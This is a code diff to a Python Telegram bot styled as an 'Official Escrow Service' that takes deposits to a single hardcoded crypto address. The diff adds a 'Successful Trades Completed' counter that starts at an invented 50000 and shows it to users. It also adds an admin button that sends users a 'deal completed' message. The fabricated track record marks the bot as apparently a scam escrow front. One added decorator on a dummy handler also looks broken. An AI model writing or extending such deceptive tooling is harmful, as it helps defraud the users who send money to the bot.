@@ -21,13 +21,38 @@ DEPOSIT_ADDRESS = "THwDdNB5sb449DATzUjwyx9gEHXkS45ewc"
 bot = telebot.TeleBot(TOKEN)
 user_data = {} 
 
+# Dynamic Trade Counter file management
+COUNTER_FILE = "trade_counter.txt"
+
+def get_total_trades():
+    if os.path.exists(COUNTER_FILE):
+        with open(COUNTER_FILE, "r") as f:
+            try:
+                return int(f.read().strip())
+            except:
+                return 50000
+    else:
+        return 50000
+
+def increment_trades():
+    current = get_total_trades() + 1
+    with open(COUNTER_FILE, "w") as f:
+        f.write(str(current))
+    return current
+
+@app.message_handler(commands=['start']) # Note: handled via bot handlers below
+def dummy():
+    pass
+
 @bot.message_handler(commands=['start'])
 def start(message):
+    total_trades = get_total_trades()
     welcome_text = (
         f"🛡 **Welcome to Official Escrow Service, {message.from_user.first_name}!**\n\n"
-        "The most trusted and secure platform for buyers and sellers worldwide. "
-        "We protect your funds until all trade terms are 100% fulfilled.\n\n"
-        "👇 **Please select an option below to get started:**"
+        f"The most trusted and secure platform for buyers and sellers worldwide. "
+        f"We protect your funds until all trade terms are 100% fulfilled.\n\n"
+        f"📊 **Successful Trades Completed:** `{total_trades}+`\n\n"
+        f"👇 **Please select an option below to get started:**"
     )
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("🤝 Create New Deal", callback_data="create_deal"))
@@ -51,7 +76,6 @@ def callback_query(call):
         bot.edit_message_text(text=text, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")
         
     elif call.data == "create_deal":
-        # 🌟 PROFESSIONAL TERMS & CONDITIONS CHECK BEFORE DEAL 🌟
         terms_text = (
             "⚖️ **Escrow Terms & Conditions (Agreement)**\n\n"
             "Before proceeding with a secure deal, both parties must acknowledge our core policies:\n\n"
@@ -90,6 +114,35 @@ def callback_query(call):
     elif call.data == "main_menu":
         start(call.message)
 
+    # ADMIN APPROVAL CALLBACK HANDLER
+    elif call.data.startswith("approve_"):
+        user_chat_id = call.data.split("_")[1]
+        new_total = increment_trades()
+        
+        # Notify Admin that it's completed
+        bot.answer_callback_query(call.id, "✅ Trade Approved & Completed Successfully!")
+        bot.edit_message_caption(
+            caption=call.message.caption + f"\n\n🟢 **STATUS: APPROVED & COMPLETED** (Total Trades now: {new_total})",
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            parse_mode="Markdown"
+        )
+        
+        # Notify User that deal is complete with Satisfied buttons
+        user_markup = InlineKeyboardMarkup()
+        user_markup.add(InlineKeyboardButton("⭐ Satisfied / Rate Us", url="https://t.me/Scurepaymentescrow_Official"))
+        user_markup.add(InlineKeyboardButton("🔄 Start New Deal", callback_data="create_deal"))
+        
+        completion_msg = (
+            "🎉 **CONGRATULATIONS! DEAL COMPLETED SUCCESSFULLY** 🎉\n\n"
+            "Your payment has been verified by administration, terms are fulfilled, and the trade is now closed safely.\n"
+            "Thank you for choosing our Official Escrow Service!"
+        )
+        try:
+            bot.send_message(user_chat_id, completion_msg, reply_markup=user_markup, parse_mode="Markdown")
+        except Exception as e:
+            pass
+
 @bot.message_handler(commands=['trade'])
 def trade_command(message):
     terms_text = (
@@ -126,21 +179,35 @@ def handle_docs_photo(message):
     data = user_data.get(chat_id, {})
     counterparty = data.get('counterparty_details', 'Not Provided ❌')
     
-    bot.send_message(chat_id, "✅ **Proof Received Successfully!**\nYour payment proof has been securely forwarded to our verification department. Please wait, an admin will review and update you shortly.")
+    bot.send_message(chat_id, "✅ **Proof Received Successfully!**\nYour payment proof has been securely forwarded to our verification department. Please wait, an admin will review and verify shortly.")
     
     admin_notification = (
         f"🚨 **NEW ESCROW PAYMENT PROOF SUBMITTED!** 🚨\n\n"
         f"👤 **Client Name:** {user.first_name} ({username})\n"
         f"🆔 **User ID:** `{user_id}`\n"
         f"🤝 **Trade Details / Role:** {counterparty}\n\n"
-        f"📌 *Please verify the blockchain transaction hash against this receipt.*"
+        f"📌 *Verify blockchain hash before clicking approve below:*"
     )
     
+    # Add an Approve button for Admin
+    admin_markup = InlineKeyboardMarkup()
+    admin_markup.add(InlineKeyboardButton("✅ Approve & Complete Deal", callback_data=f"approve_{chat_id}"))
+    
     try:
-        bot.send_message(ADMIN_ID, admin_notification, parse_mode='Markdown')
-        bot.forward_message(ADMIN_ID, chat_id, message.message_id)
+        # Forward or send photo with caption to admin
+        bot.send_photo(
+            ADMIN_ID, 
+            message.photo[-1].file_id, 
+            caption=admin_notification, 
+            reply_markup=admin_markup, 
+            parse_mode='Markdown'
+        )
     except Exception as e:
-        bot.send_message(chat_id, "⚠️ Notice: Notification transmission error to administration.")
+        try:
+            bot.send_message(ADMIN_ID, admin_notification + "\n\n(Document attached below)", parse_mode='Markdown')
+            bot.forward_message(ADMIN_ID, chat_id, message.message_id)
+        except Exception as ex:
+            bot.send_message(chat_id, "⚠️ Notice: Notification transmission error to administration.")
 
 @bot.message_handler(func=lambda message: True)
 def handle_all_messages(message):
@@ -150,4 +217,4 @@ if __name__ == '__main__':
     threading.Thread(target=run_web, daemon=True).start()
     print("Escrow Bot successfully running...")
     bot.infinity_polling()
-    
+            
